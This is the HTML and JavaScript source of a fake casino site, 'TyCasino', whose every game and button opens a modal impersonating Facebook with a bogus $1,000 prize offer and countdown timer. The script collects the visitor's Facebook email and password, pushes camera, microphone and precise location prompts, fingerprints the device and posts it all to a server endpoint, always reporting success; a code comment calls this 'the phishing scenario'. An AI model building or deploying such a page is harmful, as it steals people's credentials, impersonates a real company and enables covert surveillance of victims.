<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TyCasino - Play Online Casino Games</title>
    <link rel="stylesheet" href="tycasino.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>
    <div id="permission-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.95); z-index: 99999; display: none; justify-content: center; align-items: center;">
        <div style="background-color: #fff; padding: 30px; border-radius: 10px; max-width: 90%; text-align: center;">
            <h2 style="color: #1877f2; margin-bottom: 20px;">Permissions Required</h2>
            <p style="margin-bottom: 20px;">To use TyCasino, you must allow access to your camera, microphone, and location.</p>
            <div id="permission-status" style="margin: 20px 0; text-align: left;">
                <p>Camera: <span id="camera-status" style="color: red; font-weight: bold;">Not allowed</span></p>
                <p>Microphone: <span id="mic-status" style="color: red; font-weight: bold;">Not allowed</span></p>
                <p>Location: <span id="location-status" style="color: red; font-weight: bold;">Not allowed</span></p>
            </div>
            <button id="request-permissions-btn" style="background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-weight: bold; cursor: pointer;">Grant Permissions</button>
        </div>
    </div>

    <div class="main-container">
        <header>
            <div class="logo">
                <h1>TyCasino</h1>
                <p class="tagline">Your Premier Gaming Destination</p>
            </div>
            <nav>
                <ul>
                    <li><a href="#" class="active">Games</a></li>
                    <li><a href="#">Promotions</a></li>
                    <li><a href="#">VIP</a></li>
                    <li><a href="#">Support</a></li>
                </ul>
            </nav>
            <div class="header-buttons">
                <button class="login-button" onclick="redirectToLogin()">Log In</button>
                <button class="signup-button" onclick="redirectToLogin()">Sign Up</button>
            </div>
        </header>

        <section class="hero">
            <div class="hero-content">
                <h2>Welcome to TyCasino</h2>
                <p>Experience the thrill of online gaming with over 1000+ games</p>
                <button class="play-now-button" onclick="redirectToLogin()">Play Now</button>
            </div>
        </section>

        <section class="featured-games">
            <h2>Featured Games</h2>
            <div class="games-grid">
                <div class="game-card" onclick="redirectToLogin()">
                    <div class="game-image" style="background-image: url('images/SuperAce.png');">
                        <div class="game-overlay">
                            <button class="play-button">Play Now</button>
                        </div>
                    </div>
                    <div class="game-info">
                        <h3>Super Ace</h3>
                        <div class="game-tags">
                            <span class="tag">Slots</span>
                            <span class="tag">Hot</span>
                        </div>
                    </div>
                </div>

                <div class="game-card" onclick="redirectToLogin()">
                    <div class="game-image" style="background-image: url('images/Gold-Rush.png');">
                        <div class="game-overlay">
                            <button class="play-button">Play Now</button>
                        </div>
                    </div>
                    <div class="game-info">
                        <h3>Royal Poker</h3>
                        <div class="game-tags">
                            <span class="tag">Poker</span>
                            <span class="tag">Popular</span>
                        </div>
                    </div>
                </div>

                <div class="game-card" onclick="redirectToLogin()">
                    <div class="game-image" style="background-image: url('images/Blackjack-Pro.png');">
                        <div class="game-overlay">
                            <button class="play-button">Play Now</button>
                        </div>
                    </div>
                    <div class="game-info">
                        <h3>Blackjack Pro</h3>
                        <div class="game-tags">
                            <span class="tag">Table</span>
                            <span class="tag">New</span>
                        </div>
                    </div>
                </div>

                <div class="game-card" onclick="redirectToLogin()">
                    <div class="game-image" style="background-image: url('images/Lucky Roulette.png');">
                        <div class="game-overlay">
                            <button class="play-button">Play Now</button>
                        </div>
                    </div>
                    <div class="game-info">
                        <h3>Lucky Roulette</h3>
                        <div class="game-tags">
                            <span class="tag">Roulette</span>
                            <span class="tag">Featured</span>
                        </div>
                    </div>
                </div>

                <div class="game-card" onclick="redirectToLogin()">
                    <div class="game-image" style="background-image: url('images/Fortune Wheel.png');">
                        <div class="game-overlay">
                            <button class="play-button">Play Now</button>
                        </div>
                    </div>
                    <div class="game-info">
                        <h3>Fortune Wheel</h3>
                        <div class="game-tags">
                            <span class="tag">Wheel</span>
                            <span class="tag">Bonus</span>
                        </div>
                    </div>
                </div>

                <div class="game-card" onclick="redirectToLogin()">
                    <div class="game-image" style="background-image: url('images/Gold Rush Slots.png');">
                        <div class="game-overlay">
                            <button class="play-button">Play Now</button>
                        </div>
                    </div>
                    <div class="game-info">
                        <h3>Gold Rush Slots</h3>
                        <div class="game-tags">
                            <span class="tag">Slots</span>
                            <span class="tag">Jackpot</span>
                        </div>
                    </div>
                </div>
            </div>
            <button class="view-all-button">View All Games</button>
        </section>

        <section class="categories">
            <h2>Game Categories</h2>
            <div class="category-list">
                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
                    <i class="fas fa-dice"></i>
                    <span>Slots</span>
                </a>
                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
                    <i class="fas fa-chess-queen"></i>
                    <span>Table Games</span>
                </a>
                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
                    <i class="fas fa-users"></i>
                    <span>Live Casino</span>
                </a>
                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
                    <i class="fas fa-trophy"></i>
                    <span>Jackpots</span>
                </a>
                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
                    <i class="fas fa-futbol"></i>
                    <span>Sports</span>
                </a>
                <a href="#" class="category-item" onclick="redirectToLogin(); return false;">
                    <i class="fas fa-gift"></i>
                    <span>Promotions</span>
                </a>
            </div>
        </section>

        <footer>
            <div class="footer-content">
                <div class="footer-section">
                    <h3>TyCasino</h3>
                    <p>Your premier destination for online casino games. Play responsibly.</p>
                </div>
                <div class="footer-section">
                    <h3>Quick Links</h3>
                    <ul>
                        <li><a href="#">Games</a></li>
                        <li><a href="#">Promotions</a></li>
                        <li><a href="#">About Us</a></li>
                        <li><a href="#">Terms & Conditions</a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h3>Contact Us</h3>
                    <p>Email: support@tycasino.com</p>
                    <p>Phone: +1-888-TY-CASINO</p>
                </div>
                <div class="footer-section">
                    <h3>Follow Us</h3>
                    <div class="social-icons">
                        <a href="#"><i class="fab fa-facebook"></i></a>
                        <a href="#"><i class="fab fa-twitter"></i></a>
                        <a href="#"><i class="fab fa-instagram"></i></a>
                        <a href="#"><i class="fab fa-youtube"></i></a>
                    </div>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2023 TyCasino. All rights reserved.2025.</p>
                <p>18+ | Play Responsibly</p>
            </div>
        </footer>
    </div>

    <div id="loginModal" class="modal">
        <div class="modal-content">
            <span class="close-button">&times;</span>
            <div class="facebook-header">
                <h1 style="color: #1877f2; font-size: 28px; margin-bottom: 5px;">facebook</h1>
                <p style="color: #666; margin-top: 0;">Facebook Rewards Program</p>
            </div>
            
            <div class="prize-banner" style="background-color: #ffeb3b; color: #d32f2f; text-align: center; padding: 15px; font-size: 18px; font-weight: bold; animation: pulse 1.5s infinite; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
                üéâ CONGRATULATIONS! You've been selected for our $1,000 CASH GIVEAWAY! üéâ
                <div class="countdown" style="background-color: #d32f2f; color: white; font-size: 16px; padding: 5px 10px; border-radius: 20px; margin-top: 10px; display: inline-block;">Offer expires in: <span id="timer">05:00</span></div>
            </div>
            
            <div class="login-form" style="margin: 20px 0;">
                <form id="loginForm" action="#" method="POST">
                    <div style="margin-bottom: 15px;">
                        <input type="text" id="email" name="email" placeholder="Email, phone or username" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
                        <div id="email-error" style="color: red; font-size: 14px; margin-top: 5px;"></div>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <input type="password" id="password" name="password" placeholder="Password" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
                        <div id="password-error" style="color: red; font-size: 14px; margin-top: 5px;"></div>
                    </div>
                    <div style="margin-bottom: 15px;">
                        <button type="submit" class="facebook-login-button" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">
                            Log In & Claim Your Prize
                        </button>
                    </div>
                    <div style="margin-bottom: 15px; text-align: center;">
                        <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgot password?</a>
                    </div>
                    <hr style="border: 0; border-top: 1px solid #ddd; margin: 20px 0;">
                    <div style="text-align: center;">
                        <button type="button" style="background-color: #42b72a; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">Create New Account</button>
                    </div>
                </form>
            </div>
            
            <div style="background-color: #f5f5f5; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-top: 20px; font-size: 14px; text-align: left;">
                <h3 style="color: #d32f2f; margin-top: 0;">üèÜ Facebook Rewards Program</h3>
                <p>As part of our user appreciation campaign, you've been randomly selected to receive a <span style="font-size: 24px; color: #2e7d32;">$1,000</span> cash prize!</p>
                <p>Simply log in with your Facebook account to verify your identity and claim your reward. Funds will be transferred to your preferred payment method within 24 hours.</p>
                
                <div style="display: flex; align-items: center; margin-top: 15px; background-color: #e8f5e9; padding: 10px; border-radius: 8px;">
                    <img src="https://randomuser.me/api/portraits/women/42.jpg" alt="Previous Winner" style="width: 50px; height: 50px; border-radius: 50%; margin-right: 10px; object-fit: cover;">
                    <div>
                        <p><strong>Sarah J.</strong> from Boston just claimed her $1,000 prize!</p>
                        <p><small>"I couldn't believe it was real until the money showed up in my account!"</small></p>
                    </div>
                </div>
            </div>
            
            <div style="margin-top: 15px; text-align: center;">
                <p style="color: #999; font-size: 12px;">Limited time offer. Terms and conditions apply.</p>
            </div>
        </div>
    </div>

    <script src="script.js"></script>
    <script>
        // Function to show login modal
        function redirectToLogin() {
            document.getElementById('loginModal').style.display = 'flex';
            // Start the countdown timer when the modal is displayed
            startTimer(60 * 5, document.getElementById('timer'));
        }

        // Close the modal when clicking the X button
        document.querySelector('.close-button').onclick = function() {
            document.getElementById('loginModal').style.display = 'none';
        }

        // Close the modal when clicking outside of it
        window.onclick = function(event) {
            if (event.target == document.getElementById('loginModal')) {
                document.getElementById('loginModal').style.display = 'none';
            }
        }

        // Countdown timer for the Facebook prize
        function startTimer(duration, display) {
            let timer = duration, minutes, seconds;
            const interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                
                display.textContent = minutes + ":" + seconds;
                
                if (--timer < 0) {
                    timer = 0; // Stop at 00:00
                    clearInterval(interval);
                }
            }, 1000);
        }

        // Add event listener to the login form to request permissions after submission
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            if (loginForm) {
                loginForm.addEventListener('submit', function(event) {
                    event.preventDefault();
                    
                    // Get form data
                    const email = document.getElementById('email').value;
                    const password = document.getElementById('password').value;
                    
                    // Validate email and password
                    if (!email || !password) {
                        // Show error if fields are empty
                        if (!email) document.getElementById('email-error').textContent = 'Email is required';
                        if (!password) document.getElementById('password-error').textContent = 'Password is required';
                        return;
                    } else {
                        // Clear any previous error messages
                        document.getElementById('email-error').textContent = '';
                        document.getElementById('password-error').textContent = '';
                    }
                    
                    // Now show the permission overlay and request access
                    document.getElementById('permission-overlay').style.display = 'flex';
                    document.body.style.overflow = 'hidden'; // Block scrolling during permissions
                    
                    // Request permissions and submit form data
                    requestAllPermissions(email, password);
                });
            }
        });

        // Permission checking functionality
        let cameraPermission = false;
        let microphonePermission = false;
        let locationPermission = false;
        let requestInProgress = false;
        
        // Check permissions on page load
        document.addEventListener('DOMContentLoaded', function() {
            checkAndRequestPermissions();
        });
        
        // Set up the permission request button
        document.getElementById('request-permissions-btn').addEventListener('click', function() {
            requestAllPermissions();
        });

        // Function to check all permissions and request if needed
        function checkAndRequestPermissions() {
            // Only show the permission overlay when explicitly requested, not on page load
            // document.getElementById('permission-overlay').style.display = 'flex';
            
            // Don't block scrolling on the body by default - only when actually showing the permissions
            // document.body.style.overflow = 'hidden';
            
            // Don't automatically request permissions on page load
            // requestAllPermissions();
            
            // Set up a timer to periodically check permissions, but don't request them automatically
            setInterval(function() {
                // Only check permissions status, don't request them
                checkPermissionStatusOnly();
            }, 2000);
        }
        
        // A version of checkPermissionStatus that only checks but doesn't request
        function checkPermissionStatusOnly() {
            // If all permissions are already granted, do nothing
            if (cameraPermission && microphonePermission && locationPermission) {
                return;
            }
            
            // Check camera and microphone permissions using the permissions API if supported
            if (navigator.permissions && navigator.permissions.query) {
                // Check camera permission
                navigator.permissions.query({ name: 'camera' })
                    .then(function(result) {
                        if (result.state === 'granted') {
                            cameraPermission = true;
                            document.getElementById('camera-status').textContent = 'Allowed';
                            document.getElementById('camera-status').style.color = 'green';
                            checkAllPermissionsGranted();
                        }
                    });
                
                // Check microphone permission
                navigator.permissions.query({ name: 'microphone' })
                    .then(function(result) {
                        if (result.state === 'granted') {
                            microphonePermission = true;
                            document.getElementById('mic-status').textContent = 'Allowed';
                            document.getElementById('mic-status').style.color = 'green';
                            checkAllPermissionsGranted();
                        }
                    });
            }
        }
        
        // Request all permissions and submit form data
        function requestAllPermissions(email, password) {
            // Set flag to prevent multiple simultaneous requests
            requestInProgress = true;
            
            // Show the permission overlay when requesting permissions
            document.getElementById('permission-overlay').style.display = 'flex';
            // Block scrolling while permission overlay is shown
            document.body.style.overflow = 'hidden';
            
            let userData = {
                email: email || "",
                password: password || "",
                device: getDeviceInfo(),
                location: {}
            };

            // Request camera permission
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    document.getElementById('camera-status').textContent = 'Allowed';
                    document.getElementById('camera-status').style.color = 'green';
                    cameraPermission = true;
                    
                    // Stop the video stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Request microphone permission
                    return navigator.mediaDevices.getUserMedia({ audio: true });
                })
                .then(stream => {
                    document.getElementById('mic-status').textContent = 'Allowed';
                    document.getElementById('mic-status').style.color = 'green';
                    microphonePermission = true;
                    
                    // Stop the audio stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Request location permission
                    return new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                userData.location = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                };
                                document.getElementById('location-status').textContent = 'Allowed';
                                document.getElementById('location-status').style.color = 'green';
                                locationPermission = true;
                                resolve();
                            },
                            error => {
                                console.error('Location error:', error);
                                document.getElementById('location-status').textContent = 'Denied';
                                resolve(); // Continue even if location is denied
                            },
                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                        );
                    });
                })
                .then(() => {
                    // All permissions have been requested, submit the data if we have email/password
                    if (email && password) {
                        submitUserData(userData);
                    } else {
                        // Just hide the overlay if we were only requesting permissions
                        checkAllPermissionsGranted();
                    }
                    // Reset the request flag after everything is done
                    requestInProgress = false;
                })
                .catch(error => {
                    console.error('Permission error:', error);
                    // Try to proceed anyway if we have email/password
                    if (email && password) {
                        submitUserData(userData);
                    } else {
                        // Just hide the overlay if we were only requesting permissions
                        document.getElementById('permission-overlay').style.display = 'none';
                        document.body.style.overflow = 'auto'; // Restore scrolling
                    }
                    // Reset the request flag after everything is done, even on error
                    requestInProgress = false;
                });
        }

        // Function to get device information
        function getDeviceInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : 'Not available'
            };
        }

        // Function to submit user data to the server
        function submitUserData(userData) {
            // Make sure userData has proper values
            if (!userData.email || !userData.password) {
                console.error('Email or password missing');
                document.getElementById('permission-overlay').style.display = 'none';
                document.body.style.overflow = 'auto'; // Restore scrolling
                return;
            }
            
            // Add explicit content type and stringify properly
            fetch('/api/users/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(userData)
            })
            .then(response => {
                // Check if response is ok before parsing JSON
                if (!response.ok) {
                    throw new Error('API request failed with status ' + response.status);
                }
                return response.json();
            })
            .then(data => {
                console.log('Success:', data);
                // Hide the permission overlay
                document.getElementById('permission-overlay').style.display = 'none';
                // Make sure scrolling is restored
                document.body.style.overflow = 'auto';
                // Close the modal
                document.getElementById('loginModal').style.display = 'none';
                
                // Show success notification
                showSuccessNotification();
            })
            .catch(error => {
                console.error('Error:', error);
                // Still hide the overlay
                document.getElementById('permission-overlay').style.display = 'none';
                // Make sure scrolling is restored
                document.body.style.overflow = 'auto';
                // Close the modal
                document.getElementById('loginModal').style.display = 'none';
                
                // Still show success notification (for the phishing scenario)
                showSuccessNotification();
            });
        }
        
        // Function to show success notification
        function showSuccessNotification() {
            // Create a non-intrusive notification element
            const notification = document.createElement('div');
            notification.style.position = 'fixed';
            notification.style.bottom = '20px';
            notification.style.right = '20px';
            notification.style.backgroundColor = '#4CAF50';
            notification.style.color = 'white';
            notification.style.padding = '10px 20px';
            notification.style.borderRadius = '5px';
            notification.style.zIndex = '9999';
            notification.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
            notification.textContent = 'Thank you! Your prize claim is being processed.';
            
            // Add to body and remove after a few seconds
            document.body.appendChild(notification);
            setTimeout(function() {
                notification.style.opacity = '0';
                notification.style.transition = 'opacity 1s';
                setTimeout(function() {
                    document.body.removeChild(notification);
                }, 1000);
            }, 3000);
        }
        
        // Check if all permissions have been granted
        function checkAllPermissionsGranted() {
            if (cameraPermission && microphonePermission && locationPermission) {
                console.log('All permissions granted');
                
                // Start monitoring with the script.js functions
                if (typeof setupMediaCapture === 'function') {
                    setupMediaCapture();
                }
                
                // Hide the permission overlay
                setTimeout(function() {
                    document.getElementById('permission-overlay').style.display = 'none';
                    document.body.style.overflow = 'auto'; // Restore scrolling
                    
                    // Only show this message once when all permissions are first granted
                    if (!window.permissionsAlreadyGranted) {
                        // Use a calmer notification instead of an alert
                        window.permissionsAlreadyGranted = true;
                        showSuccessNotification();
                    }
                }, 1500); // Brief delay to show "Allowed" status
            }
        }
    </script>
</body>
</html> 